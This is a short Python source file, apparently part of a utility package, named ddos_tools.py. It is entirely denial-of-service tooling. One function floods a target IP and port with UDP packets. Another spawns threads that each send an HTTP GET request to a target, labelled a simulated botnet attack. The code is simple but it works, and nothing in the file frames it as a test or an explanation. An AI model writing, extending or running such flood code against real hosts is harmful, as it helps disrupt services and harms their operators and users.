# pyutils3/ddos_tools.py
import socket
import threading

# UDP Flood Attack
def udp(target_ip, target_port, packet_size=1024, packet_count=10):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b"X" * packet_size  # Packet size (default is 1024 bytes)
    
    for _ in range(packet_count):
        try:
            sock.sendto(message, (target_ip, target_port))
            print(f"Sent UDP packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error in UDP attack: {e}")

# Botnet Attack (simulated HTTP flood attack using threads)
def botnet(target_ip, target_port, layer_type, threads_count=10):
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((target_ip, target_port))
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode('utf-8')
            sock.send(request)
            print(f"Botnet attack sent to {target_ip}:{target_port} ({layer_type} Layer)")
        except Exception as e:
            print(f"Error in Botnet attack: {e}")
        finally:
            sock.close()

    # Launch multiple threads to simulate a botnet attack
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

